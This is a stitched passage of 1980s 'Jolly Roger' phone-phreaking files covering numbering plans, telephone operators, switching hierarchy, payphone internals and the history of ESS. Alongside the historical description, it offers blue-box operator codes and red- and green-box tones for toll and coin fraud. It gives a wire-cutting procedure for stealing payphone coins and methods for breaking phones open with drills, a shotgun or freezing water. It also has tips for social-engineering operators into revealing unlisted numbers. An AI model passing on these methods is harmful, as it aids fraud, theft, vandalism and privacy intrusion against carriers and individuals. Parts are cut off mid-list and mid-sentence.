    Box 368 
    Plymouth Meeting PA., 19462 
Ask for catalog #28 
They  are usually $300 - $600, and are supposed to have  MF  
dialing  capability as well as TT dialing.  They are also of much  
higher quality than the standard bell test sets. 
If you would like to learn more about the subjects covered here,  
I suggest: 
1>  Follow Bell trucks and linemen or technicians and ask  subtle  
    questions. also try 611 (repair service) and ask questions.. 
2> Explore your area for any Bell hardware,  and experiment  with  
   it.  Don't try something if you are not sure what youre doing,  
   because you wouldnt want to cause problems, would you?

To start off, we will discuss the dialing procedures for domestic 
as well as international dialing. We will also take a look at the 
telephone numbering plan.

North American Numbering Plan
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In North America, the telephone numbering plan is as follows:

A) a 3 digit Numbering Plan Area (NPA) code , ie, area code
B) a 7 digit telephone # consisting of a 3 digit Central Office 
(CO) code plus a 4 digit station #

These 10 digits are called the network address or destination 
code. It is in the format of:
 
      Area Code         Telephone #
      ---------         -----------

         N*X             NXX-XXXX

Where: N = a digit from 2 to 9
       * = the digit 0 or 1
       X = a digit from 0 to 9

Area Codes
~~~~~~~~~~

Check your telephone book or the seperate listing of area codes 
found on many bbs's. Here are the special area codes (SAC's):

   510 - TWX (USA)
   610 - TWX (Canada)
   700 - New Service
   710 - TWX (USA)
   800 - WATS
   810 - TWX (USA)
   900 - DIAL-IT Services
   910 - TWX (USA)

The other area codes never cross state lines, therefore each state 
must have at least one exclusive NPA code. When a community is 
split by a state line, the CO #'s are often interchangeable (ie, 
you can dial the same number from two different area codes).

TWX (Telex II) consists of 5 teletype-writer area codes. They are 
owned by Western Union. These SAC's may only be reached via other 
TWX machines. These run at 110 baud (last I checked! They are most 
likely faster now!). Besides the TWX #'s, these machines are 
routed to normal telephone #'s. TWX machines always respond with 
an answerback. For example, WU's FYI TWX # is (910) 279-5956. The 
answerback for this service is "WU FYI MAWA".

If you don't want to but a TWX machine, you can still send TWX 
messages using Easylink [800/325-4112]. However you are gonna have 
to hack your way onto this one!

700:

700 is currently used by AT&T as a call forwarding service. It is 
targeted towards salesmen on the run. To understand how this 
works, I'll explain it with an example. Let's say Joe Q. Salespig 
works for AT&T security and he is on the run chasing a phreak 
around the country who royally screwed up an important COSMOS 
system. Let's say that Joe's 700 # is (700) 382-5968. Everytime 
Joe goes to a new hotel (or most likely SLEAZY MOTEL), he dials a 
special 700 #, enters a code, and the number where he is staying. 
Now, if his boss received some important info, all he would do is 
dial (700) 382-5968 and it would ring wherever Joe last progammed 
it to. Neat, huh?

800:

This SAC is one of my favourites since it allows for toll free 
calls. INWARD WATS (INWATS), or Inward Wide Area 
Telecommunications Service is the 800 #'s that we are all familiar 
with. 800 #'s are set up in service areas or bands. There are 6 of 
these. Band 6 is the largest and you can call a band 6 # from 
anywhere in the US except the state where the call is terminated 
(that is why most companies have one 800 number for the countery 
and then another one for their state.) Band 5 includes the 48 
contiguous states. All the way down to band 1 which includes only 
the states contiguous to that one. Therefore, less people can 
reach a band 1 INWATS # than a band 6 #.

Intrastate INWATS #'s (ie, you can call it from only 1 state) 
always have a 2 as the last digit in the exchange (ie, 800-NX2-
XXXX). The NXX on 800 #'s represent the area where the business is 
located. For example, a # beginning with 800-431 would terminate 
at a NY CO.

800 #'s always end up in a hunt series in a CO. This means that it 
tries the first # allocated to the company for their 800 lines; if 
this is busy, it will try the next #, etc. You must have a minimum 
of 2 lines for each 800 #. For example, Travelnet uses a hunt 
series. If you dial (800) 521-8400, it will first try the # 
associated with 8400; if it is busy it will go to the next 
available port, etc. INWATS customers are billed by the number of 
hours of calls made to their #.

OUTWATS (OUTWARD WATS): OUTWATS are for making outgoing calls 
only. Largecompanies use OUTWATS since they receive bulk-rate 
discounts. Since OUTWATS numbers cannot have incoming calls, they 
are in the format of:

   (800) *XXX-XXXX

Where * is the digit 0 or 1 (or it may even be designated by a 
letter) which cannot be dialed unless you box the call. The *XX 
identifies the type of service and the areas that the company can 
call.

Remember:

 INWATS + OUTWATS = WATS EXTENDER

900:

This DIAL-IT SAC is a nationwide dial-it service. It is use for 
taking television polls and other stuff. The first minute 
currently costs an outrageous 50-85 cents and each additional 
minute costs 35-85 cents. Hell takes in a lot of revenue this way!

Dial (900) 555-1212 to find out what is currently on this service.

CO CODES
~~~~~~~~

These identify the switching office where the call is to be 
routed. The following CO codes are reserved nationwide:

   555 - directory assistance
   844 - time. These are now in!
   936 - weather the 976 exchange
   950 - future services
   958 - plant test
   959 - plant test
   970 - plant test (temporary)
   976 - DIAL-IT services

Also, the 3 digit ANI & ringback #'s are regarded as plant test 
and are thus reserved. These numbers vary from area to area. 

You cannot dial a 0 or 1 as the first digit of the exchange code 
(unless using a blue box!). This is due to the fact that these 
exchanges (000-199) contains all sorts of interesting shit such as 
conference #'s, operators, test #'s, etc.

950:

Here are the services that are currently used by the 950 exchange:

   1000 - SPC
   1022 - MCI Execunet
   1033 - US Telephone
   1044 - Allnet
   1066 - Lexitel
   1088 - SBS Skyline

These SCC's (Specialized Common Carriers) are free from fortress 
phones! Also, the 950 exchange will probably be phased out with 
the introduction of Equal Access

Plant Tests:

These include ANI, Ringback, and other various tests.

976:

Dial 976-1000 to see what is currently on the service. Also, many 
bbs's have listings of these numbers.

N11 codes:
----------
Bell is trying to phase out some of these, but they still exist in 
most areas. 

  011 - international dialing prefix
  211 - coin refund operator
  411 - directory assistance
  611 - repair service
  811 - business office
  911 - EMERGENCY

International Dialing
~~~~~~~~~~~~~~~~~~~~~

With International Dialing, the world has been divided into 9 
numbering zones. To make an international call, you must first 
dial: International Prefix + Country code + National #

In North America, the international dialing prefix is 011 for 
station-to-station calls. If you can dial International #'s 
directly in your area then you have International Direct Distance 
Dialing (IDDD).

The country code, which varies from 1 to 3 digits, always has the 
world numbering zone as the first digit. For example, the country 
code for the United Kingdom is 44, thus it is in world numbering 
zone 4. Some boards may contain a complete listing of other 
country codes, but here I give you a few:

   1 - North America (US, Canada, etc.)
  20 - Egypt
 258 - Mozambique
  34 - Spain
  49 - Germany
  52 - Mexico (southern portion)
   7 - USSR
  81 - Japan
  98 - Iran (call & hassle those bastards!)

If you call from an area other than North America, the format is 
generally the same. For example, let's say that you wanted to call 
the White House from Switzerland to tell the prez that his 
numbered bank account is overdrawn (it happens, you know! ha ha). 
First you would dial 00 (the SWISS international dialing refix), 
then 1 (the US country code), followed by 202-456-1414 (the 
national # for the White House. Just ask for Georgy and give him 
the bad news!)

Also, country code 87 is reserved for Maritime mobile service, ie, 
calling ships:

   871 - Marisat (Atlantic)
   871 - Marisat (Pacific)
   872 - Marisat (Indian)

International Switching:
------------------------

In North America there are currently 7 no. 4 ESS's that perform 
the duty of ISC (Inter-nation Switching Centers). All 
international calls dialed from numbering zone 1 will be routed 
through one of these "gateway cities". They are:

  182 - White Plains, NY
  183 - New York, NY
  184 - Pittsburgh, PA
  185 - Orlando, Fl
  186 - Oakland, CA
  187 - Denver, CO
  188 - New York, NY

The 18X series are operator routing codes for overseas access (to 
be furthur discussed with blue boxes). All international calls use 
a signaling service called CCITT.It is an international standard 
for signaling.

Ok.. there you go for now! If you wanna read more about this, read 
part two which is the next file #36 in the Jolly Roger's cookbook!
         
                                       -RFLAGG-Phone Systems Tutorial part II                  by The Jolly Roger

Part II will deal with the various types of operators, office 
heirarchy, & switching equipment.

Operators
~~~~~~~~~

There are many types of operators in the network and the more 
common ones will be discussed.

TSPS Operator:

The TSPS [(Traffic Service Position System) ass opposed to This 
Shitty Phone Service] Operator is probably the bitch (or bastard, 
for the female libertationists out there) that most of us are used 
to having to deal with. Here are his/her responsibilities:

1) Obtaning billing information for calling card or third number 
calls

2) Identifying called customer on person-to-person calls.

3) Obtaining acceptance of charges on collect calls.

4) Identifying calling numbers. This only happens when the calling 
# is not automatically recorded by CAMA (Centralized Automatic 
Message Accounting) & forwarded from the local office. This could 
be caused by equipment failures (ANIF- Automatic Number 
Identification Failure) or if the office is not equipped for CAMA 
(ONI- Operator Number Identification).

<I once has an equipment failure happen to me & the TSPS operator 
came on and said, "What # are you calling FROM?" Out of curiosity, 
I gave her the number to my CO, she thanked me & then I was 
connected to a conversation that appeared to be between a frameman 
& his wife. Then it started ringing the party I wanted to 
originally call & everyone phreaked out (excuse the pun). I 
immediately dropped this dual line conference!

You should not mess with the TSPS operator since she KNOWS which 
number that you are calling from. Your number will show up on a 
10-digit LED read-out (ANI board). She also knows whether or not 
you are at a fortress phone & she can trace calls quite readily! 
Out of all of the operators, she is one of the MOST DANGEROUS.

INWARD operator:

This operator assists your local TSPS ("0") operatorin connecting 
calls. She will never question a call as long as the call is 
withing HER SERVICE AREA. She can only be reached via other 
operators or by a blue box. From a blue box, you would dial 
KP+NPA+121+ST for the INWARD operator that will help you connect 
any calls within that NPA only. (Blue Boxing will be discussed in 
a future file).

DIRECTORY ASSISTANCE Operator:

This is the operator that you are connected to when you dial: 411 
or NPA-555-1212. She does not readily know where you are calling 
from. She does not have access to unlisted numbers, but she DOES 
know if an unlisted # exists for a certain listing.

There is also a directory assistance operator for deaf people who 
use teletypewriters. If your modem can transfer BAUDOT [(45.5 
baud). One modem that I know of that will do this is the Apple Cat 
acoustic or the Atari 830 acoustic modem. Yea I know they are hard 
to find... but if you wanna do this.. look around!) then you can 
call him/her up and have an interesting conversation. The # is: 
800-855-1155. They use the standard Telex abbreviations such as GA 
for go ahead. they tend to be nicer and will talk longer than your 
regular operators. Also, they are more vulnerable into being 
talked out of information through the process of "social 
engineering" as Chesire Catalyst would put it. 

<Unfortunately, they do not have access to much. I once 
bullshitted with one of these operators a while back and I found 
out that there are 2 such DA offices that handle TTY. One is in 
Philadelphia and the other is in California. They have approx. 7 
operators each. most of the TTY operators think that their job is 
boring (based on an official "BIOC poll"). They also feel that 
they are under-paid. They actually call up a regular DA # to 
process your request (sorry, no fancy computers!)

Other operators have access to their own DA by dialing 
KP+NPA+131+ST (MF).

CN/A operators:

CN/A Operators are operators that do exactly the opposite of what 
directory assistance operators are for. In my experience, these 
operators know more than the DA op's do & they are more 
susceptable to "social engeneering." It is possible to bullshit a 
CN/A operator for the NON-PUB DA # (ie, you give them the name & 
they give you the unlisted number. See the article on unlisted 
numbers in this cookbook for more info about them.). This is due 
to the fact that they assume that you are a fellow company 
employee. Unfortunately, the AT&T breakup has resulted in the 
break-up of a few NON-PUB DA #'s and policy changes in CN/A

INTERCEPT Operator:

The intercept operator is the one that you are connected to when 
there are notenough recordings available to tell you that the # 
has been disconnected or changed. She usually says, "What # you 
callin'?" with a foreign accent. This is the lowest operator 
lifeform. Even though they don't know where you are calling from, 
it is a waste or your time to try to verbally abuse them since 
they usually understand very little English anyway.

Incidentally, a few area DO have intelligent INTERCEPT Operators.

OTHER Operators:

And then there are the: MObile, Ship-to-Shore, Conference, Marine 
Verify, "Leave Word and Call Back," Rout & Rate 
(KP+800+141+1212+ST), & other special operators who have one 
purpose or another in the network.

Problems with an Operator> Ask to speak to their supervisor... or 
better yet the Group Chief (who is the highest ranking official in 
any office) who is the equivalent of the Madame ina whorehouse.

By the way, some CO's that willallow you to dial a 0 or 1 as the 
4th digit, will also allow you to call special operators & other 
fun Tel. Co. #'s without a blue box. This is ver rare, though! For 
example,212-121-1111 will get you a NY Inward Operator.

Office Hierarchy
~~~~~~~~~~~~~~~~

Every switching office in North America (the NPA system), is 
assigned an office name and class. There are five classes of 
offices numbered 1 through 5. Your CO is most likely a class 5 or 
end office. All long-distance (Toll) calls are switched by a toll 
office which can be a class 4, 3, 2, or 1 office. There is also a 
class 4X office callen an intermediate point. The 4X office is a 
digital one that can have an unattended exchange attached to it 
(known as a Remote Switching Unit (RSU)).

The following chart will list the Office #, name, & how many of 
those office exist (to the best of my knowledge) in North America:

Class                 Name           Abb          # Existing
-----        ----------------------- ---      -----------------
> 1          Regional Center          RC                   12
> 2          Sectional Center         SC                   67
> 3          Primary Center           PC                  230
> 4          Toll Center              TC                1,300
> 4P         Toll Point               TP                 n/a
> 4X         Intermediate Point       IP                 n/a
> 5          End Office               EO               19,000
> 6          RSU                     RSU                 n/a

When connecting a call from one party to another, the switching 
equipment usually tries to find the shortest route between the 
class 5 end office of the caller & the class 5 end officeof the 
called party. If no inter-office trunks exist between the two 
parties, it will then move upward to the next highest office for 
servicing calls (Class 4). If the Class 4 office cannot handle the 
call by sending it to another Class 4 or 5 office, it will then be 
sent to the next highest office in the hierarchy (3). The 
switching equipment first uses the high-usage interoffice trunk 
groups, if they are busy then it goes to the fina; trunk groups on 
the next highest level. If the call cannot be connected, you will 
probably get a re-order [120 IPM (interruptions per minute) busy 
signal] signal. At this time, the guys at Network Operations are 
probably shitting in their pants and trying to avoid the dreaded 
Network Dreadlock (as seen on TV!).

It is also interesting to note that 9 connections in tandem is 
called ring-around-the-rosy and it has never occured in telephone 
history. This would cause an endless loop connection [a neat way 
to really screw up the network].

The 10 regional centers in the US & the 2 in Canada are all 
interconnected. they form the foundation of the entire telephone 
network. Since there are only 12 of them, they are listed below:

Class 1 Regional Office Location   NPA
--------------------------------   ---
Dallas 4 ESS                       214
Wayne, PA                          215
Denver 4T                          303
Regina No. 2SP1-4W (Canada)        306
St. Louis 4T                       314
Rockdale, GA                       404
Pittsburgh 4E                      412
Montreal No. 1 4AETS (Canada)      504

Phone Systems Tutorial III                      by The Jolly Roger

PREFACE:

THIS ARTICLE WILL FOCUS PRIMARILY ON THE STANDARD WESTERN ELECTRIC SINGLE-
SLOT COIN TELEPHONE (AKA FORTRESS FONE) WHICH CAN BE DIVIDED INTO 3 TYPES:
- DIAL-TONE FIRST (DTF)
- COIN-FIRST (CF):  (IE, IT WANTS YOUR $ BEFORE YOU RECEIVE A DIAL TONE)
- DIAL POST-PAY SERVICE (PP):  YOU PAYAFTER THE PARTY ANSWERS

DEPOSITING COINS (SLUGS):
-------------------------
ONCE YOU HAVE DEPOSITED YOUR SLUG INTO A FORTRESS, IT IS SUBJECTED TO A
GAMUT OF TESTS. THE FIRST OBSTACAL FOR A SLUG IS THE
MAGNETIC TRAP.  THIS WILL STOP ANY LIGHT-WEIGHT MAGNETIC SLUGS AND COINS.
IF IT PASSES THIS, THE SLUG IS THEN CLASSIFIED AS A NICKEL, DIME, OR
QUARTER.  EACH SLUG IS THEN CHECKED FOR APPROPRIATE SIZE AND WEIGHT.  IF THESE
TESTS ARE PASSED, IT WILL THEN TRAVEL THROUGH A NICKEL, DIME, OR QUARTER
MAGNET AS APPROPRIATE.  THESE MAGNETS SET UP AN EDDY CURRENT EFFECT WHICH
CAUSES COINS OF THE APPROPRIATE CHARACTERISTICS TO SLOW DOWN SO THEY
WILL FOLLOW THE CORRECT TRAJECTORY.  IF ALL GOES WELL, THE COIN WILL FOLLOW THE
CORRECT PATH (SUCH AS BOUNCING OFF OF THE NICKEL ANVIL) WHERE IT WILL
HOPEFULLY FALL INTO THE NARROW ACCEPTED COIN CHANNEL.
THE RATHER ELABORATE TESTS THAT ARE PERFORMED AS THE COIN TRAVELS DOWN THE
COIN CHUTE WILL STOP MOST SLUGS AND OTHER UNDESIRABLE COINS, SUCH AS
PENNIES, WHICH MUST THEN BE RETRIEVED USING THE COIN RELEASE LEVER.
IF THE SLUG MIRACULOUSLY SURVIVES THE GAMUT, IT WILL THEN STRIKE THE
APPROPRIATE TOTALIZER ARM CAUSING A RATCHET WHEEL TO ROTATE ONCE FOR EVERY
5-CENT INCREMENT (EG, A QUARTER WILL CAUSE IT TO ROTATE 5 TIMES).
THE TOTALIZER THEN CAUSES THE COIN SIGNAL OSCILLATOR TO READOUT A DUAL-
FREQUENCY SIGNAL INDICATING THE VALUE DEPOSITED TO ACTS (A COMPUTER) OR THE
TSPS OPERATOR. THESE ARE THE SAME TONES USED BY PHREAKS IN THE INFAMOUS RED
BOXES. FOR A QUARTER, 5 BEEP TONES ARE
OUTPULSED AT 12-17 PULSES PER SECOND (PPS).  A DIME CAUSES 2 BEEP TONES AT
5 - 8.5 PPS WHILE A NICKEL CAUSES ONE BEEP TONE AT 5 - 8.5 PPS.  A BEEP
CONSISTS OF 2 TONES:  2200 + 1700 HZ. A RELAY IN THE FORTRESS CALLED THE "B
RELAY" (YES, THERE IS ALSO AN 'A RELAY') PLACES A CAPACITOR ACROSS THE
SPEECH CIRCUIT DURING TOTALIZER READOUT TO PREVENT THE "CUSTOMER" FROM
HEARING THE RED BOX TONES. IN OLDER 3 SLOT PHONES:  ONE BELL
(1050-1100 HZ) FOR A NICKEL, TWO BELLS FOR A DIME, AND ONE GONG (800 HZ) FOR A
QUARTER ARE USED INSTEAD OF THE MODERN DUAL-FREQUENCY TONES.

=============
=TSPS & ACTS=
=============

WHILE FORTRESSES ARE CONNECTED TO THE CO OF THE AREA, ALL TRANSACTIONS ARE
HANDLED VIA THE TRAFFIC SERVICE POSITION SYSTEM (TSPS).  IN AREAS THAT
DO NOT HAVE ACTS, ALL CALLS THAT REQUIRE OPERATOR ASSISTANCE, SUCH AS
CALLING CARD AND COLLECT, ARE AUTOMATICALLY ROUTED TO A TSPS OPERATOR
POSITION. IN AN EFFORT TO AUTOMATE FORTRESS
SERVICE, A COMPUTER SYSTEM KNOWN AS AUTOMATED COIN TOLL SERVICE (ACTS) HAS
BEEN IMPLEMENTED IN MANY AREAS.  ACTS LISTENS TO THE RED BOX SIGNALS FROM THE
FONES AND TAKES APPROPRIATE ACTION.  IT IS ACTS WHICH SAYS, "TWO DOLLARS PLEASE
(PAUSE) PLEASE DEPOSIT TWO DOLLARS FOR THE NEXT TEN SECONDS" (AND OTHER
VARIATIONS). ALSO, IF YOU TALK FOR MORE THAN THREE MINUTES AND THEN HANG-UP,
ACTS WILL CALL BACK AND DEMAND YOUR MONEY.  ACTS IS ALSO RESPONSIBLE FOR
AUTOMATED CALLING CARD SERVICE. ACTS ALSO PROVIDE TROUBLE DIAGNOSIS FOR
CRAFTSPEOPLE (REPAIRMEN SPECIALIZING IN FORTRESSES).  FOR EXAMPLE, THERE IS A
COIN TEST WHICH IS GREAT FOR TUNING UP RED BOXES.  IN MANY AREAS THIS TEST CAN
BE ACTIVATED BY DIALING 09591230 AT A FORTRESS (THANKS TO KARL MARX FOR THIS
INFORMATION).  ONCE ACTIVATED IT WILL REQUEST THAT YOU DEPOSIT VARIOUS COINS.
IT WILL THEN IDENTIFY THE COIN AND OUTPULSE THE APPROPRIATE RED BOX
SIGNAL.  THE COINS ARE USUALLY RETURNED WHEN YOU HANG UP.
TO MAKE SURE THAT THERE IS ACTUALLY MONEY IN THE FONE, THE CO INITIATES A
"GROUND TEST" AT VARIOUS TIMES TO DETERMINE IF A COIN IS ACTUALLY IN THE
FONE.  THIS IS WHY YOU MUST DEPOSIT AT LEAST A NICKEL IN ORDER TO USE A RED
BOX!

GREEN BOXES:
------------

PAYING THE INITIAL RATE IN ORDER TO USE A RED BOX (ON CERTAIN FORTRESSES)
LEFT A SOUR TASTE IN MANY RED BOXER'S MOUTHS THUS THE GREEN BOX WAS INVENTED.
THE GREEN BOX GENERATES USEFUL TONES SUCH AS COIN COLLECT, COIN RETURN, AND
RINGBACK.  THESE ARE THE TONES THAT ACTS OR THE TSPS OPERATOR WOULD SEND TO
THE CO WHEN APPROPRIATE. UNFORTUNATELY, THE GREEN BOX CANNOT BE USED AT A
FORTRESS STATION BUT IT MUST BE USED BY THE CALLED PARTY.

HERE ARE THE TONES:
     COIN COLLECT       700 + 1100 HZ
     COIN RETURN       1100 + 1700 HZ
     RINGBACK           700 + 1700 HZ
BEFORE THE CALLED PARTY SENDS ANY OF THESE TONES, AN OPERATOR RELEASED
SIGNAL SHOULD BE SENT TO ALERT THE MF DETECTORS AT THE CO.  THIS CAN BE
ACCOMPLISHED BY SENDING 900 + 1500 HZ OR A SINGLE 2600 HZ WINK (90 MS)
FOLLOWED BY A 60 MS GAP AND THEN THE APPROPRIATE SIGNAL FOR AT LEAST 900 MS.
ALSO, DO NOT FORGET THAT THE INITIAL RATE IS COLLECTED SHORTLY BEFORE THE 3
MINUTE PERIOD IS UP. INCIDENTALLY, ONCE THE ABOVE MF TONES
FOR COLLECTING AND RETURNING COINS REACH THE CO, THEY ARE CONVERTED INTO
AN APPROPRIATE DC PULSE (-130 VOLTS FOR RETURN & +130 VOLTS FOR COLLECT). THIS
PULSE IS THEN SENT DOWN THE TIP TO THE FORTRESS.  THIS CAUSES THE COIN RELAY
TO EITHER RETURN OR COLLECT THE COINS. THE ALLEGED "T-NETWORK" TAKES ADVANTAGE
OF THIS INFORMATION.  WHEN A PULSE FOR COIN COLLECT (+130 VDC) IS SENT DOWN
THE LINE, IT MUST BE GROUNDED SOMEWHERE.  THIS IS USUALLY EITHER THE
YELLOW OR BLACK WIRE.  THUS, IF THE WIRES ARE EXPOSED, THESE WIRES CAN BE
CUT TO PREVENT THE PULSE FROM BEING GROUNDED.  WHEN THE THREE MINUTE
INITIAL PERIOD IS ALMOST UP, MAKE SURE THAT THE BLACK & YELLOW WIRES ARE
SEVERED; THEN HANG UP, WAIT ABOUT 15 SECONDS IN CASE OF A SECOND PULSE,
RECONNECT THE WIRES, PICK UP THE FONE, HANG UP AGAIN, AND IF ALL GOES WELL IT
SHOULD BE "JACKPOT" TIME.

PHYSICAL ATTACK:
----------------

A TYPICAL FORTRESS WEIGHS ROUGHLY 50 LBS. WITH AN EMPTY COIN BOX.  MOST OF
THIS IS ACCOUNTED FOR IN THE ARMOR PLATING.  WHY ALL THE SECURITY?  WELL,
BELL CONTRIBUTES IT TO THE FOLLOWING: "SOCIAL CHANGES DURING THE 1960'S
MADE THE MULTISLOT COIN STATION A PRIME TARGET FOR:  VANDALISM, STRONG ARM
ROBBERY, FRAUD, AND THEFT OF SERVICE. THIS BROUGHT ABOUT THE INTRODUCTION OF
THE MORE RUGGED SINGLE SLOT COIN  STATION AND A NEW ENVIRONMENT FOR COIN
SERVICE." AS FOR PICKING THE LOCK, I WILL QUOTE MR. PHELPS:
"WE OFTEN FANTASIZE ABOUT 'PICKING THE LOCK' OR 'GETTING A MASTER
KEY.'  WELL, YOU CAN FORGET ABOUT IT. I DON'T LIKE TO DISCOURAGE PEOPLE, BUT
IT WILL SAVE YOU FROM WASTING ALOT OF OUR TIME--TIME WHICH CAN BE PUT TO
BETTER USE (HEH, HEH)." AS FOR PHYSICAL ATTACK, THE COIN PLATE
IS SECURED ON ALL FOUR SIDE BY HARDENED STEEL BOLTS WHICH PASS THROUGH TWO
SLOTS EACH.  THESE BOLTS ARE IN TURN INTERLOCKED BY THE MAIN LOCK.
ONE PHREAK I KNOW DID MANAGE TO TAKE ONE OF THE 'MOTHERS' HOME (WHICH WAS
ATTACHED TO A PIECE OF PLYWOOD AT A CONSTRUCTION SITE; OTHERWISE, THE
PERMANENT ONES ARE A BITCH TO DETACH FROM THE WALL!).  IT TOOK HIM ALMOST
TEN HOURS TO OPEN THE COIN BOX USING A POWER DRILL, SLEDGE HAMMERS, AND CROW
BARS (WHICH WAS EMPTY -- PERHAPS NEXT TIME, HE WILL DEPOSIT A COIN FIRST TO
HEAR IF IT SLUSHES DOWN NICELY OR HITS THE EMPTY BOTTOM WITH A CLUNK.)
TAKING THE FONE OFFERS A HIGHER MARGIN OF SUCCESS.  ALTHOUGH THIS MAY BE
DIFFICULT OFTEN REQUIRING BRUTE FORCE AND THERE HAS BEEN SEVERAL CASES OF
BACK AXLES BEING LOST TRYING TO TAKE DOWN A FONE!  A QUICK AND DIRTY WAY TO
OPEN THE COIN BOX IS BY USING A SHOTGUN.  IN DETROIT, AFTER ECOLOGISTS
CLEANED OUT A MUNICIPAL POND, THEY FOUND 168 COIN PHONE RIFLED.
IN COLDER AREAS, SUCH AS CANADA, SOME SHREWD PEOPLE TAPE UP THE FONES USING
DUCT TAPE, POUR IN WATER, AND COME BACK THE NEXT DAY WHEN THE WATER WILL HAVE
FROZE THUS EXPANDING AND CRACKING THE FONE OPEN.
IN ONE CASE, "UNAUTHORIZED COIN COLLECTORS" WHERE CAUGHT WHEN THEY
BROUGHT $6,000 IN CHANGE TO A BANK AND THE BANK BECAME SUSPICIOUS...
AT ANY RATE, THE MAIN LOCK IS AN EIGHT LEVEL TUMBLER LOCATED ON THE RIGHT SIDE
OF THE COIN BOX.  THIS LOCK HAS 390,625 POSSIBLE POSITIONS (5 ^ 8, SINCE THERE
ARE 8 TUMBLERS EACH WITH 5 POSSIBLE POSITIONS) THUS IT IS HIGHLY PICK
RESISTANT!  THE LOCK IS HELD IN PLACE BY 4 SCREWS.  IF THERE IS SUFFICIENT
CLEARANCE TO THE RIGHT OF THE FONE, IT IS CONCEIVABLE TO PUNCH OUT THE SCREWS
USING THE DRILLING PATTERN BELOW (PROVIDED BY ALEXANDER MUNDY IN TAP #32):

====================================
                       !!        ^

                       !!
===================================

AFTER THIS IS ACCOMPLISHED, THE LOCK CAN BE PUSHED BACKWARDS DISENGAGING
THE LOCK FROM THE COVER PLATE.  THE FOUR BOLTS OF THE COVER PLATE CAN THEN
BE RETRACTED BY TURNING THE BOLTWORKS WITH A SIMPLE KEY IN THE SHAPE OF THE
HOLE ON THE COIN PLATE (SEE DIAGRAM BELOW).  OF COURSE, THERE ARE OTHER
METHODS AND DRILLING PATTERNS.

    DIAGRAM OF COVER PLATE KEYHOLE

THE TOP COVER USES A SIMILAR (BUT NOT AS STRONG) LOCKING METHOD WITH THE
KEYHOLE DEPICTED ABOVE ON THE TOP LEFT HIDE AND A REGULAR LOCK (PROBABLY
TUMBLER ALSO) ON THE TOP RIGHT-HAND SIDE. IT IS INTERESTING TO EXPERIMENT
WITH THE COIN SHUTE AND THE FORTRESSES OWN "RED BOX" (WHICH BELL DIDN'T HAVE
THE 'BALLS' TO COLOR RED).

MISCELLANEOUS:
--------------

IN A FEW AREAS (RURAL & CANADA), POST-PAY SERVICE EXISTS.  WITH THIS TYPE OF
SERVICE, THE MOUTHPIECE IS CUT OFF UNTIL THE CALLER DEPOSITS MONEY WHEN
THE CALLED PARTY ANSWERS.  THIS ALSO ALLOWS FOR FREE CALLS TO WEATHER AND
OTHER DIAL-IT SERVICES!  RECENTLY, 2600 MAGAZINE ANNOUNCED THE CLEAR BOX WHICH
CONSISTS OF A TELEPHONE PICKUP COIL AND A SMALL AMP.  IT IS BASED ON THE
RINCIPAL THAT THE RECEIVER IS ALSO A WEAK TRANSMITTER AND THAT BY AMPLIFYING
YOUR SIGNAL YOU CAN TALK VIA THE TRANSMITTER THUS AVOIDING COSTLY
TELEPHONE CHARGES! MOST FORTRESSES ARE FOUND IN THE 9XXX
AREA.  UNDER FORMER BELL AREAS, THEY USUALLY START AT 98XX (RIGHT BELOW THE
99XX OFFICIAL SERIES) AND MOVE DOWNWARD.
SINCE THE LINE, NOT THE FONE, DETERMINES WHETHER OR NOT A DEPOSIT
MUST BE MADE, DTF & CHARGE-A-CALL FONES MAKE GREAT EXTENSIONS!
FINALLY, FORTRESS FONES ALLOW FOR A NEW HOBBY--INSTRUCTION PLATE COLLECTING.
ALL THAT IS REQUIRED IS A FLAT-HEAD SCREWDRIVER AND A PAIR OF NEEDLE-NOSE
PLIERS.  SIMPLY USE THE SCREWDRIVER TO LIFT UNDERNEATH THE PLATE SO THAT YOU
CAN GRAB IT WITH THE PLIERS AND YANK DOWNWARDS. I WOULD SUGGEST COVERING THE
TIPS OF THE PLIERS WITH ELECTRICAL TAPE TO PREVENT SCRATCHING.  TEN CENT PLATES
ARE DEFINITELY BECOMING A "RARITY!"

FORTRESS SECURITY:
------------------

WHILE A LONELY FORTRESS MAY SEEM THE PERFECT TARGET, BEWARE!  THE GESTAPO
HAS BEEN KNOWN TO STAKE OUT FORTRESSES FOR AS LONG AS 6 YEARS ACCORDING TO THE
GRASS ROOTS QUARTERLY.  TO AVOID ANY PROBLEMS, DO NOT USE THE SAME FONES
REPEATEDLY FOR BOXING, CALLING CARDS, & OTHER EXPERIMENTS.  THE TELCO KNOWS HOW
MUCH MONEY SHOULD BE IN THE COIN BOX AND WHEN ITS NOT THERE THEY TEND TO GET
PERTURBED (READ:  PISSED OFF).

The History of ESS                     Courtesy of the Jolly Roger

   Of all the new 1960s wonders of telephone technology -
satellites, ultra modern Traffic Service Positions (TSPS) for
operators, the picturephone, and so on - the one that gave Bell
Labs the most trouble, and unexpectedly became the greatest
development effort in Bell System's history, was the perfection
of an electronic switching system, or ESS.

   It may be recalled that such a system was the specific end in
view when the project that had culminated in the invention of the
transistor had been launched back in the 1930s. After successful
accomplishment of that planned miracle in 1947-48, further delays
were brought about by financial stringency and the need for
further development of the transistor itself. In the early 1950s,
a Labs team began serious work on electronic switching. As early
as 1955, Western Electric became involved when five engineers
from the Hawthorne works were assigned to collaborate with the
Labs on the project. The president of AT&T in 1956, wrote
confidently, "At Bell Labs, development of the new electronic
switching system is going full speed ahead. We are sure this will
lead to many improvements in service and also to greater
efficiency. The first service trial will start in Morris, Ill.,
in 1959." Shortly thereafter, Kappel said that the cost of the
whole project would probably be $45 million.

   But it gradually became apparent that the developement of a
commercially usable electronic switching system - in effect, a
computerized telephone exchange - presented vastly greater
technical problems than had been anticipated, and that,
accordingly, Bell Labs had vastly underestimated both the time
and the investment needed to do the job. The year 1959 passed
without the promised first trial at Morris, Illinois; it was
finally made in November 1960, and quickly showed how much more
work remained to be done. As time dragged on and costs mounted,
there was a concern at AT&T and something approaching panic at
Bell Labs. But the project had to go forward; by this time the
investment was too great to be sacrificed, and in any case,
forward projections of increased demand for telephone service
indicated that within a phew years a time would come when,
without the quantum leap in speed and flexibility that electronic
switching would provide, the national network would be unable to
meet the demand. In November 1963, an all-electronic switching
system went into use at the Brown Engineering Company at Cocoa
Beach, Florida. But this was a small installation, essentially
another test installation, serving only a single company.
Kappel's tone on the subject in the 1964 annual report was, for
him, an almost apologetic: "Electronic switching equipment must
be manufactured in volume to unprecedented standards of
reliability.... To turn out the equipment economically and with
